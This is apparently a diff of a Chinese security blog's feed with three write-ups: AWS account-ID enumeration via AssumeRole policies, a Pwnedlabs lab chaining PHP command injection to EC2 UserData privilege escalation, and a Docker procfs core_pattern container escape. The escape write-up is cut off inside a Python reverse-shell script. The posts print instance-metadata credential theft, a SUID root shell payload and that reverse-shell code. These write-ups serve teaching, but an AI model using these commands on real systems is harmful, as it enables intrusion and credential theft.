+<p>清空SessionToken<code>aws configure set aws_session_token &quot;&quot;</code>，切换到原来的用户。说一下这个穷举的原理。在执行<code>sts:Assumerole</code>的时候，可以指定<code>--policy</code>参数来指定一个附加的权限策略，这个策略将与你要扮演的角色的权限策略结合（取交集），最终确定你在该角色下的实际权限。</p>
+<p>根据这个利用脚本：<a href="https://github.com/WeAreCloudar/s3-account-search/blob/main/s3_account_search/cli.py"><strong>s3-account-search</strong></a>，它附加的策略<code>--policy</code>是</p>
+<pre><code class="language-json">{
+    &quot;Version&quot;: &quot;2012-10-17&quot;,
+    &quot;Statement&quot;: [
+        {
+            &quot;Sid&quot;: &quot;AllowResourceAccount&quot;,
+            &quot;Effect&quot;: &quot;Allow&quot;,
+            &quot;Action&quot;: &quot;s3:*&quot;,
+            &quot;Resource&quot;: &quot;*&quot;,
+            &quot;Condition&quot;: {
+                &quot;StringLike&quot;: {&quot;s3:ResourceAccount&quot;: [f&quot;{digits}*&quot;]},
+            },
+        },
+    ],
+}
+</code></pre>
+<p>其中<code>Condition</code>元素允许你指定策略生效的条件，而在 <code>Condition</code> 元素中可以使用条件运算符来将策略中的条件键和值与请求上下文中的值进行匹配。其中的<code>StringLike</code>可以做通配符匹配（参考：<a href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html">IAM JSON 策略元素：条件运算符</a>），依次来爆破出<code>s3:ResourceAccount</code>，也就是该<strong>S3</strong>资源的<strong>Account-ID</strong>。</p>
+<p>下面做个测试。<code>&quot;s3:ResourceAccount&quot;:&quot;0*&quot;</code>也就是<code>Account-ID</code>是0开头</p>
+<pre><code class="language-json">aws sts assume-role --role-arn arn:aws:iam::&lt;Account-ID&gt;:role/s3reader --role-session-name skky --policy '{&quot;Version&quot;:&quot;2012-10-17&quot;,&quot;Statement&quot;:[{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:&quot;s3:*&quot;,&quot;Resource&quot;:&quot;*&quot;,&quot;Condition&quot;:{&quot;StringLike&quot;:{&quot;s3:ResourceAccount&quot;:&quot;0*&quot;}}}]}' 
+</code></pre>
+<p>这时无法列出S3内容，说明该S3的<code>Account-ID</code>不是0开头的<br>
+<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720017715189-7ff834e6-7a79-4598-9b7a-8d29cec5fdf4.png" alt="image.png" loading="lazy"></p>
+<p>而修改为<code>&quot;s3:ResourceAccount&quot;:&quot;1*&quot;</code>可以访问<br>
+<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720017934528-5e3c0b6e-86a9-4d88-b909-e732455c0eb2.png" alt="image.png" loading="lazy"></p>
+<p>利用这个方式我们就可以枚举出该S3的Account-ID，这里直接使用脚本进行枚举<a href="https://github.com/WeAreCloudar/s3-account-search/blob/main/s3_account_search/cli.py">https://github.com/WeAreCloudar/s3-account-search/blob/main/s3_account_search/cli.py</a><br>
+<img src="https://skyblu3519.github.io/post-images/AWSIAMRolesReconnaissance/1720018611726-464cc43d-4e8f-4e4c-9ab2-e941fca45463.png" alt="image.png" loading="lazy"></p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/">Assume the Worst: Enumerating AWS Roles through ‘AssumeRole’</a><br>
+<a href="https://rhinosecuritylabs.com/aws/aws-iam-user-enumeration/">Using AWS Account ID’s for IAM User Enumeration</a><br>
+<a href="https://rhinosecuritylabs.com/aws/aws-role-enumeration-iam-p2/">Unauthenticated AWS Role Enumeration (IAM Revisited)</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[Pwnedlabs]Command Injection to EC2 User Data Privilege Escalation]]></title>
+        <id>https://skyblu3519.github.io/post/pwnedlabscommand-injection-to-ec2-user-data-privilege-escalation/</id>
+        <link href="https://skyblu3519.github.io/post/pwnedlabscommand-injection-to-ec2-user-data-privilege-escalation/">
+        </link>
+        <updated>2024-07-03T15:10:08.000Z</updated>
+        <content type="html"><![CDATA[<p>题目地址：<a href="https://pwnedlabs.io/labs/command-injection-to-ec2-user-data-privilege-escalation">https://pwnedlabs.io/labs/command-injection-to-ec2-user-data-privilege-escalation</a></p>
+<p>题目描述：</p>
+<blockquote>
+<p>After a successful smishing attack on your client, Huge Logistics, you've obtained AWS credentials for a user account. Your task is to use these initial credentials to explore and possibly expand your access within their cloud environment. Your objective is to demonstrate impact of smishing the user. Let the hunt begin.</p>
+</blockquote>
+<h1 id="背景知识">背景知识</h1>
+<h2 id="aws-userdata">AWS UserData</h2>
+<p>通过编辑 <strong>UserData</strong> 可以让 <strong>EC2</strong> 启动时执行 <strong>Shell脚本</strong> 和 <strong>cloud-init指令</strong>。</p>
+<p>支持的格式有，如果只执行<strong>Shell脚本</strong>，则脚本内容必须以<code>#!</code>开头后面指向要读取脚本的解释器的路径（通常为 <code>/bin/bash</code>）</p>
+<pre><code class="language-shell">#!/bin/bash
+yum update -y
+amazon-linux-extras install -y lamp-mariadb10.2-php7.2 php7.2
+yum install -y httpd mariadb-server
+systemctl start httpd
+systemctl enable httpd
+usermod -a -G apache ec2-user
+chown -R ec2-user:apache /var/www
+chmod 2775 /var/www
+find /var/www -type d -exec chmod 2775 {} \;
+find /var/www -type f -exec chmod 0664 {} \;
+echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; /var/www/html/phpinfo.php
+</code></pre>
+<p>如果要传递<strong>cloud-init指令</strong>，那么则要以<code>#cloud-config</code>开头</p>
+<pre><code class="language-yaml">#cloud-config
+repo_update: true
+repo_upgrade: all
+
+packages:
+- httpd
+- mariadb-server
+
+runcmd:
+- [ sh, -c, &quot;amazon-linux-extras install -y lamp-mariadb10.2-php7.2 php7.2&quot; ]
+- systemctl start httpd
+- sudo systemctl enable httpd
+- [ sh, -c, &quot;usermod -a -G apache ec2-user&quot; ]
+- [ sh, -c, &quot;chown -R ec2-user:apache /var/www&quot; ]
+- chmod 2775 /var/www
+- [ find, /var/www, -type, d, -exec, chmod, 2775, {}, \; ]
+- [ find, /var/www, -type, f, -exec, chmod, 0664, {}, \; ]
+- [ sh, -c, 'echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; /var/www/html/phpinfo.php' ]
+</code></pre>
+<p>如果要<strong>cloud-init</strong>和<strong>Shell</strong>混用，则可以使用 mime-multi part 文件类型，使用 <code>text/cloud-config </code>和 <code>text/x-shellscript</code> 来表示<strong>cloud-init指令</strong>和<strong>Shell脚本</strong>。</p>
+<pre><code class="language-yaml">Content-Type: multipart/mixed; boundary=&quot;//&quot;
+MIME-Version: 1.0
+
+--//
+Content-Type: text/cloud-config; charset=&quot;us-ascii&quot;
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename=&quot;cloud-config.txt&quot;
+
+#cloud-config
+cloud-init directives
+
+--//
+Content-Type: text/x-shellscript; charset=&quot;us-ascii&quot;
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename=&quot;userdata.txt&quot;
+
+#!/bin/bash
+shell script commands
+--//--
+</code></pre>
+<h1 id="解题流程">解题流程</h1>
+<p>使用题目给的AK/SK登录，<code>aws sts get-caller-identity</code>确认身份<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719995161639-adbba1ba-52de-4f19-900a-d6ab377efac2.png" alt="image.png" loading="lazy"></p>
+<p>然后就是常规的策略挖掘。从用户的托管策略<code>arn:aws:iam::564061345713:policy/Compute</code>中发现用户拥有<code>ec2:DescribeInstances</code>权限</p>
+<pre><code>aws iam list-attached-user-policies --user-name ryan
+aws iam get-policy --policy-arn arn:aws:iam::564061345713:policy/Compute
+aws iam get-policy-version --policy-arn arn:aws:iam::564061345713:policy/Compute --version-id v1
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719995316352-3243e9a7-b513-479e-a46f-edeb6a35106f.png" alt="image.png" loading="lazy"></figure>
+<p>尝试列出实例，这里使用<code>--filters</code>筛选出运行的实例，再用<code>--query</code>精简输出的信息。这里看到了一个内网IP为<code>10.8.0.31</code>的运行实例（对实例的访问要使用平台提供的VPN）。</p>
+<pre><code>aws ec2 describe-instances --filters Name=instance-state-name,Values=running --query 'Reservations[].Instances[].[Tags[?Key==`Name`].Value | [0],InstanceId,Platform,State.Name,PrivateIpAddress,PublicIpAddress,InstanceType,PublicDnsName,KeyName]'
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998921283-fc5c0737-8788-4123-9279-38e3de8ed353.png" alt="image.png" loading="lazy"></figure>
+<p>实例开放了22和80端口<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998916790-4370689c-b0a3-4249-9214-43d72b352294.png" alt="image.png" loading="lazy"></p>
+<p>访问<code>/tracking</code>这里存在一个命令注入的漏洞，导致的原因这里就直接看源码了，正常测我觉得自己是想不到了。</p>
+<pre><code class="language-php">&lt;?php
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_POST[&quot;tracking-number&quot;] != 'e.g. RH729454758CN') {
+
+  $number = $_POST[&quot;tracking-number&quot;];
+  system(&quot;grep \&quot;$number\&quot; shipment_export.csv 2&gt;&amp;1 &gt; /dev/null &amp;&amp; echo \&quot;&lt;p&gt;The parcel is arriving soon&lt;/p&gt;\&quot; || echo \&quot;&lt;p&gt;Could not find shipment number: $number&lt;/p&gt;\&quot;&quot;);
+}
+
+?&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998886725-8382dc5a-d2e7-4a05-a848-0b9adf6c952c.png" alt="image.png" loading="lazy"></figure>
+<p>这样我们就可以用<code>$(command)</code>来注入命令<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998880778-a520c044-5f1b-4196-b0fc-486bdedf20e9.png" alt="image.png" loading="lazy"></p>
+<p>在<code>/file_backups</code>发现<code>id_rsa</code>文件。<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998853867-3dbfc0b2-c50b-4653-bdd1-960468546bb6.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998871614-8cba45fc-a609-44ad-b81c-16516e13331a.png" alt="image.png" loading="lazy"></p>
+<p>读取保存将其作为实例的私钥尝试登录</p>
+<pre><code>vim id_rsa
+chmod 400 id_rsa
+ssh -i id_rsa ryan@10.222.0.237
+</code></pre>
+<p><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998845144-23b5d467-be99-4ede-a616-3cb27221785e.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998840223-b4111775-4866-493c-9cea-126bc6145d93.png" alt="image.png" loading="lazy"></p>
+<p>请求169.254.169.254查看实例上是否有关联的IAM角色</p>
+<pre><code>curl 169.254.169.254/latest/meta-data/iam/info/
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719999089566-ee029003-390e-4908-8531-d2434d456504.png" alt="image.png" loading="lazy"></figure>
+<p>这里显示了一个ComputeAdmin角色，查看它的凭证</p>
+<pre><code>curl 169.254.169.254/latest/meta-data/iam/security-credentials/ComputeAdmin/
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998826694-9943ef0d-21e2-46c9-953c-73583f45687e.png" alt="image.png" loading="lazy"></figure>
+<p>用它提供的凭证扮演角色<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719998802915-60ebf549-f97e-47e3-9370-76ea1bf07801.png" alt="image.png" loading="lazy"></p>
+<p>还是策略挖掘一波。在角色托管策略中显示该角色具有<code>ec2:ModifyInstanceAttribute</code>权限，同时也可以停止和启动实例</p>
+<pre><code>aws iam list-attached-role-policies --role-name ComputeAdmin
+aws iam get-policy --policy-arn arn:aws:iam::728997323732:policy/ComputeAdmin
+aws iam get-policy-version --policy-arn arn:aws:iam::728997323732:policy/ComputeAdmin --version-id v1
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1719999300825-67f56790-bd14-42b8-ab84-c2eb74740bd4.png" alt="image.png" loading="lazy"></figure>
+<p>所以我们可以停止实例，然后修改实例的Userdata来执行任意命令以实现实例用户 **ryan **的提权。传入的userdata如下：</p>
+<ul>
+<li>使用cloud-init指令指定了 scripts-user 模块，配置为在每次系统启动时都执行。
+<ul>
+<li>scripts-user 模块允许用户编写自定义脚本并确保它们在系统启动时执行。这些脚本通常被放置在实例的 <code>/var/lib/cloud/instance/scripts</code> 目录中。</li>
+</ul>
+</li>
+<li>在shell部分，首先复制 <code>/bin/sh</code> 到 <code>/home/ryan/suid</code>。接着使用 <code>chmod u+s /home/ryan/suid</code> 命令设置 UID 位，使任何用户都可以以 root 用户的权限运行 <code>/home/ryan/suid</code>。</li>
+</ul>
+<pre><code>Content-Type: multipart/mixed; boundary=&quot;//&quot;
+MIME-Version: 1.0
+
+--//
+Content-Type: text/cloud-config; charset=&quot;us-ascii&quot;
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename=&quot;cloud-config.txt&quot;
+
+#cloud-config
+cloud_final_modules:
+- [scripts-user, always]
+
+--//
+Content-Type: text/x-shellscript; charset=&quot;us-ascii&quot;
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment; filename=&quot;userdata.txt&quot;
+
+#!/bin/bash
+cp /bin/sh /home/ryan/suid
+chmod u+s /home/ryan/suid
+whoami &gt;&gt; /home/ryan/output
+--//
+</code></pre>
+<p>将上面的文件保存为<code>userdata.txt</code>，再将其输出为base64编码</p>
+<pre><code>base64 -i userdata.txt -o userdata.b64.txt
+</code></pre>
+<p>在实例中查看通过元数据查看实例ID</p>
+<pre><code># curl http://169.254.169.254/latest/meta-data/instance-id
+i-0d9a8dae1fb451cff
+</code></pre>
+<p>ComputeAdmin角色也确实拥有该实例权限<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720011322191-2ea5cbf4-ed66-4c54-997f-c4e7b29e4c2f.png" alt="image.png" loading="lazy"></p>
+<p>暂停实例</p>
+<pre><code>aws ec2 stop-instances --instance-id i-0d9a8dae1fb451cff
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720011010761-b08633df-2946-4b6d-b260-aaf95345659e.png" alt="image.png" loading="lazy"></figure>
+<p>修改userdata</p>
+<pre><code>aws ec2 modify-instance-attribute --instance-id=i-0d9a8dae1fb451cff --attribute userData --value file://userdata.b64.txt
+</code></pre>
+<p>启动实例</p>
+<pre><code>aws ec2 start-instances --instance-id i-0d9a8dae1fb451cff
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720011738806-dc79a222-8c97-4a69-ac31-127f2f7e2b64.png" alt="image.png" loading="lazy"></figure>
+<p>ssh连上后在用户目录下出现了我们复制的suid，执行<code>./suid -p</code>当前shell权限变成root<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012083978-75f86c30-542e-4d6f-80c9-43634ff5fe87.png" alt="image.png" loading="lazy"></p>
+<p>查看output文件可以得知userdata是以root权限执行的<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012503404-e58e79be-a31f-45c9-98a3-a34c0d6add1b.png" alt="image.png" loading="lazy"></p>
+<p><code>cloud-config.txt</code>被复制到<code>/var/lib/cloud/instance/</code>目录下<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012510953-ef6bcc91-d20f-46bd-a1b8-12603f936da3.png" alt="image.png" loading="lazy"></p>
+<p><code>userdata.txt</code>被复制到<code>/var/lib/cloud/instance/scripts/</code>目录下<br>
+<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012515086-422cc7e2-9230-4f5a-885c-ef73278f85fd.png" alt="image.png" loading="lazy"></p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/instancedata-data-categories.html">https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/instancedata-data-categories.html</a><br>
+<a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/user-data.html%5D">https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/user-data.html</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[Docker容器安全3]Docker文件存储 & 挂载宿主机 procfs 容器逃逸]]></title>
+        <id>https://skyblu3519.github.io/post/docker-rong-qi-an-quan-3docker-wen-jian-cun-chu-and-gua-zai-su-zhu-ji-procfs-rong-qi-tao-yi/</id>
+        <link href="https://skyblu3519.github.io/post/docker-rong-qi-an-quan-3docker-wen-jian-cun-chu-and-gua-zai-su-zhu-ji-procfs-rong-qi-tao-yi/">
+        </link>
+        <updated>2024-05-11T15:35:31.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="docker文件存储背景知识">Docker文件存储背景知识</h1>
+<h2 id="docker-镜像">Docker 镜像</h2>
+<p>Docker 镜像是一个由多个层（layers）组成的只读模板。这些层堆叠在一起，构成了一个完整的文件系统，镜像可以用来创建容器。</p>
+<h2 id="层layer">层（Layer）</h2>
+<p>每个层通常对应于 Dockerfile 中的一条指令（如 FROM、COPY、RUN 等）。这些层是只读的，并且通过叠加技术（union file system）组合在一起，形成了镜像的最终内容。</p>
+<h2 id="层的堆叠和镜像">层的堆叠和镜像</h2>
+<ul>
+<li>只读层：这些层是只读的，并且是镜像的一部分。每个层包含了与前一层的差异部分。这些层共同构成了镜像的文件系统。</li>
+<li>可写层：当容器启动时，会在镜像的所有只读层之上添加一个新的可写层，这一层是容器专有的，存储运行容器时的所有变更。</li>
+<li>每个容器都有其自己的可写容器层，并且所有更改都存储在该容器层中，所以多个容器可以共享对同一基础映像的访问，但具有自己的数据状态。下</li>
+</ul>
+<p><img src="https://skyblu3519.github.io/post-images/1715441777002.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1715441784258.png" alt="" loading="lazy"></p>
+<h2 id="写时复制copy-on-write-cow机制">写时复制（Copy-on-Write, CoW）机制</h2>
+<p>当容器中的文件被修改时，存储驱动程序会执行写时复制操作，以确保只读层不被修改，并将更改写入到可写层中。具体步骤如下：</p>
+<ol>
+<li>查找文件：当需要修改一个文件时，存储驱动程序首先会在镜像层中搜索该文件。这个过程从最新的镜像层开始，一层一层向下搜索，直到找到文件为止。</li>
+<li>Copy-up操作：一旦找到文件，存储驱动程序会将该文件的副本复制到可写容器层中。这个过程称为“copy-up”操作。</li>
+<li>修改文件：文件被复制到可写层后，所有对该文件的修改都会在可写层中进行。容器中的进程将只能看到可写层中的修改后的文件，而不会再访问只读层中的原始文件。</li>
+</ol>
+<p>不同的存储驱动程序（如 AUFS、OverlayFS、Overlay2）处理写时复制操作的具体方式可能有所不同，OverlayFS是推荐的存储驱动程序。</p>
+<h2 id="overlay2存储驱动">Overlay2存储驱动</h2>
+<p>OverlayFS 是 Linux 内核中一种联合文件系统，它允许将多个目录合并为一个逻辑上的单一目录结构。其核心概念是通过将多个层（通常是只读层和一个可写层）合并，提供一个统一的文件系统视图。</p>
+<h3 id="主要概念">主要概念</h3>
+<ul>
+<li>lowerdir：只读层，包含基础文件系统。</li>
+<li>upperdir：可写层，记录所有的写操作。</li>
+<li>workdir：工作目录，OverlayFS 操作所需的临时存储。</li>
+</ul>
+<p>overlay 和 overlay2 是 Docker 中基于 OverlayFS 的两种存储驱动程序。</p>
+<h3 id="overlay">overlay</h3>
+<ul>
+<li>overlay 是最早的基于 OverlayFS 的存储驱动程序。</li>
+<li>它支持简单的两层结构（一个 lowerdir 和一个 upperdir）。</li>
+<li>对于较大的镜像和大量层的场景，性能和可扩展性方面有一定的局限性。</li>
+</ul>
+<h3 id="overlay2">overlay2</h3>
+<ul>
+<li>overlay2 是改进后的存储驱动程序，克服了 overlay 的一些局限性。</li>
+<li>支持多层结构（multiple lowerdirs），即可以将多个只读层（lowerdir）叠加起来，进一步提高了灵活性和可扩展性。</li>
+<li>在性能和稳定性方面都有所提升，适合处理更复杂的镜像和层次结构。</li>
+</ul>
+<h3 id="测试">测试</h3>
+<p>使用<code>docker info</code>查看docker使用的文件驱动</p>
+<pre><code># docker info | grep &quot;Storage Driver&quot;
+...
+ Storage Driver: overlay2
+  Backing Filesystem: extfs
+  Supports d_type: true
+  Using metacopy: false
+  Native Overlay Diff: true
+  userxattr: false
+...
+</code></pre>
+<p>拉取一个ubuntu:20.04镜像：</p>
+<pre><code># docker pull ubuntu:20.04
+20.04: Pulling from library/ubuntu
+d4c3c94e5e10: Pull complete
+Digest: sha256:874aca52f79ae5f8258faff03e10ce99ae836f6e7d2df6ecd3da5c1cad3a912b
+Status: Downloaded newer image for ubuntu:20.04
+docker.io/library/ubuntu:20.04
+</code></pre>
+<p>镜像拉取了一层，查看 overlay2 的目录：</p>
+<pre><code># ls -l /var/lib/docker/overlay2/
+total 8
+drwx--x--- 3 root root 4096 May 11 18:38 105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6
+drwx------ 2 root root 4096 May 11 18:38 l
+</code></pre>
+<p>overlay2 目录下出现了一个镜像层目录和一个<code>l</code>目录，首先来查看一下<code>l</code>目录的内容：</p>
+<pre><code># ls -l /var/lib/docker/overlay2/l
+total 4
+lrwxrwxrwx 1 root root 72 May 11 18:38 DT325SQS52JQUKKHRELWLMM64Z -&gt; ../105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/diff
+</code></pre>
+<p>可以看到l目录是一堆软连接，把一些较短的随机串软连到镜像层的 diff 文件夹下，这样做是为了避免达到mount命令参数的长度限制。</p>
+<p>再看下这个镜像层中的内容：</p>
+<pre><code># ls -l /var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/
+total 8
+drwxr-xr-x 17 root root 4096 May 11 18:39 diff
+-rw-r--r--  1 root root   26 May 11 18:38 link
+</code></pre>
+<p>这里包含 diff目录 和 link文件：</p>
+<ul>
+<li>diff目录：包含了该层的所有文件和目录内容。这是一个可写层，存储了在该层中所做的所有更改。<br>
+<img src="https://skyblu3519.github.io/post-images/1715442172976.png" alt="" loading="lazy"></li>
+<li>link文件：内容为该镜像层的短 ID</li>
+</ul>
+<pre><code># cat /var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/link
+DT325SQS52JQUKKHRELWLMM64Z
+</code></pre>
+<p>在 Docker 镜像或容器的详细信息中，<code>GraphDriver</code> 部分提供了关于存储驱动程序的具体信息。</p>
+<pre><code># docker inspect ubuntu:20.04
+
+......省略部分
+&quot;GraphDriver&quot;: {
+    &quot;Data&quot;: {
+        &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/merged&quot;,
+        &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/diff&quot;,
+        &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/work&quot;
+    },
+    &quot;Name&quot;: &quot;overlay2&quot;
+},
+......
+</code></pre>
+<p>字段解释：</p>
+<ul>
+<li>Name: 指定存储驱动程序的名称。这里面，存储驱动程序为 overlay2。</li>
+<li>Data: 包含与 overlay2 存储驱动程序相关的具体目录信息。
+<ul>
+<li>MergedDir: 指向合并目录，该目录提供了容器运行时的统一视图。当容器运行时，MergedDir 是实际挂载点，它将多个只读层和一个可写层合并在一起，提供一个完整的文件系统视图。</li>
+<li>UpperDir: 指向上层目录，该目录包含可写层的内容。当容器对文件系统进行写操作时，修改会写入 UpperDir。这是写时复制（Copy-on-Write）机制的一部分。</li>
+<li>WorkDir: 指向工作目录，该目录用于 OverlayFS 的临时存储操作。WorkDir 是 OverlayFS 所需的，支持文件系统操作如创建和删除文件时的临时存储。</li>
+</ul>
+</li>
+</ul>
+<p>启动容器</p>
+<pre><code>docker run -d --name=ubt ubuntu: 20.04 tail -f /dev/null
+</code></pre>
+<p><code>/var/lib/docker/overlay2/</code>多了个表示容器层的目录</p>
+<pre><code># ls -l /var/lib/docker/overlay2/
+total 12
+drwx--x--- 3 root root 4096 May 11 21:44 105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6
+drwx--x--- 5 root root 4096 May 11 21:44 76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8
+drwx------ 2 root root 4096 May 11 21:44 l
+</code></pre>
+<p>查看容器层目录内容</p>
+<pre><code># ls -l /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8
+total 20
+drwxr-xr-x 2 root root 4096 May 11 21:44 diff
+-rw-r--r-- 1 root root   26 May 11 21:44 link
+-rw-r--r-- 1 root root   57 May 11 21:44 lower
+drwxr-xr-x 1 root root 4096 May 11 21:44 merged
+drwx------ 3 root root 4096 May 11 21:44 work
+</code></pre>
+<p>文件解释：</p>
+<ul>
+<li>lower文件：该层依赖的所有下层的目录路径。<code>l</code>目录下的短链接</li>
+<li>merged目录：提供容器的合并文件系统视图。所有对文件系统的访问都会通过这个合并视图。</li>
+<li>work 目录: 用于 OverlayFS 操作的临时存储。</li>
+</ul>
+<p>在容器中写入一个文件<code>/home/test</code>，它会出现在<code>diff</code>和<code>merged</code>目录中</p>
+<pre><code># tree /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/diff/
+/var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/diff/
+├── home
+│   └── test
+└── root
+
+
+# tree /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/merged/home/
+/var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/merged/home/
+└── test
+</code></pre>
+<h1 id="挂载宿主机-procfs-逃逸">挂载宿主机 procfs 逃逸</h1>
+<h2 id="背景">背景</h2>
+<p><code>/proc/sys/kernel/core_pattern</code>文件用于配置生成进程核心转储（core dump）文件的模式，其内容定义了核心转储文件的命名模式和存储位置。当一个程序崩溃时，操作系统会生成一个核心转储文件，其中包含进程的内存快照、寄存器状态等信息。</p>
+<p>从 2.6.19 内核版本开始，Linux 支持在 <code>/proc/sys/kernel/core_pattern</code> 中使用新语法。如果该文件中的首个字符是管道符<code>|</code>，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。</p>
+<pre><code class="language-shell">|/usr/local/bin/core_handler %p %u %g %s %t %h %e
+</code></pre>
+<p>这样，当一个程序崩溃时，核心转储信息会被传递给 <code>/usr/local/bin/core_handler</code> 脚本进行处理。其中占位符的解释：</p>
+<ul>
+<li><code>%p</code>：进程 ID</li>
+<li><code>%u</code>：用户 ID</li>
+<li><code>%g</code>：组 ID</li>
+<li><code>%s</code>：进程的信号号</li>
+<li><code>%t</code>：时间戳</li>
+<li><code>%h</code>：主机名</li>
+<li><code>%e</code>：可执行文件名</li>
+</ul>
+<h2 id="攻击思路">攻击思路</h2>
+<p>所以这个的原理就是当<code>/proc/sys/kernel/core_pattern</code>被挂载到容器中时，可以在容器中写一个恶意脚本，根据前面的知识这个脚本在真实主机中的位置是可以找到的。然后编辑<code>/proc/sys/kernel/core_pattern</code>使用管道符指向该脚本，再写一个可以使进程崩溃的脚本触发，让物理执行这个脚本，进而获得物理机的shell实现容器逃逸。</p>
+<h2 id="实验">实验</h2>
+<p>创建一个容器并挂载 <code>/proc</code> 目录</p>
+<pre><code class="language-shell">docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
+</code></pre>
+<p>如果找到两个 <code>core_pattern</code> 文件，那可能就是挂载了宿主机的 procfs</p>
+<pre><code class="language-shell">find / -name core_pattern
+</code></pre>
+<p>查看容器的挂载路径</p>
+<pre><code class="language-shell">mount | grep overlay
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1715442187875.png" alt="" loading="lazy"></figure>
+<p>从返回可以知道，写文件在物理机的路径为</p>
+<pre><code class="language-shell">/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/diff
+/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/merged
+</code></pre>
+<p>安装 vim 和 gcc</p>
+<pre><code class="language-shell">apt-get update -y &amp;&amp; apt-get install vim gcc -y
+</code></pre>
+<p>创建一个反弹 Shell 的 py 脚本<code>/tmp/.t.py</code></p>
+<pre><code class="language-python">#!/usr/bin/python3
+import  os
+import pty
+import socket
+lhost = &quot;IP&quot;
+lport = 9999
+def main():
+   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   s.connect((lhost, lport))
+   os.dup2(s.fileno(), 0)
+   os.dup2(s.fileno(), 1)
+   os.dup2(s.fileno(), 2)
+   os.putenv(&quot;HISTFILE&quot;, '/dev/null')
